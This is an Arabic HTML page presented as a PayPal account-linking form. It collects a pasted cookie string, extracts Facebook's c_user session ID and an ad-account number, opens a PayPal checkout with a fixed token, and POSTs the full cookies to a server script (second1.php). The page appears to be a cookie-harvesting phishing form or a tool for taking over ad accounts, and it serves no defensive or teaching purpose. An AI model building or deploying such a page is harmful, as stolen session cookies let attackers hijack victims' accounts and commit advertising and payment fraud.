<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ربط حساب PayPal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f9;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            margin: auto;
            margin-top: 50px;
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            background-color: #007bff;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .paypal-button img {
            width: 200px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h3>ربط حساب PayPal</h3>
        
        <label>معرف الحساب:</label>
        <input type="text" id="account_id" readonly>

        <label>رقم الحساب الإعلاني:</label>
        <input type="text" id="ad_account">

        <label>الكوكيز:</label>
        <input type="text" id="cookies">

        <button onclick="extractAccountInfo()">🔍 استعلام</button>
        <button class="paypal-button" onclick="openPaypal()">
            <img src="paypal.jpeg" alt="PayPal Checkout">
        </button>
        
        <button onclick="linkAccount()">ربط الحساب</button>
    </div>

    <script>
        function extractAccountInfo() {
            let cookies = document.getElementById("cookies").value.trim();
            if (!cookies) {
                alert("يرجى إدخال الكوكيز!");
                return;
            }

            // استخراج معرف الحساب (c_user)
            let cUserMatch = cookies.match(/c_user=(\d+)/);
            let cUser = cUserMatch ? cUserMatch[1] : "غير معروف";
            document.getElementById("account_id").value = cUser;

            // استخراج رقم الحساب الإعلاني (adaccount)
            let adAccountMatch = cookies.match(/adaccount=(\d+)/);
            let adAccount = adAccountMatch ? adAccountMatch[1] : "غير معروف";
            document.getElementById("ad_account").value = adAccount;
        }

        function openPaypal() {
            let adAccount = document.getElementById("ad_account").value.trim();
            if (!adAccount) {
                alert("يرجى إدخال رقم الحساب الإعلاني قبل المتابعة!");
                return;
            }
            
            window.open("https://www.paypal.com/checkoutnow?token=EC-20B89377D5285764C", "_blank");
        }
        
        function linkAccount() {
            let adAccount = document.getElementById("ad_account").value.trim();
            let cUser = document.getElementById("account_id").value;
            let cookies = document.getElementById("cookies").value;

            if (!adAccount || !cUser || !cookies) {
                alert("يرجى إدخال جميع البيانات!");
                return;
            }

            fetch("second1.php", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `adaccount=${encodeURIComponent(adAccount)}&c_user=${encodeURIComponent(cUser)}&cookies=${encodeURIComponent(cookies)}`
            })
            .then(response => response.text())
            .then(data => {
                console.log("Response from server:", data);
                alert("✅ تم إرسال البيانات بنجاح!");
                window.location.href = "done.html"; // توجيه المستخدم لصفحة النجاح
            })
            .catch(error => {
                console.error("❌ خطأ أثناء الإرسال:", error);
                alert("❌ حدث خطأ أثناء الإرسال. تحقق من Console لمزيد من التفاصيل.");
            });
        }
    </script>
</body>
</html>
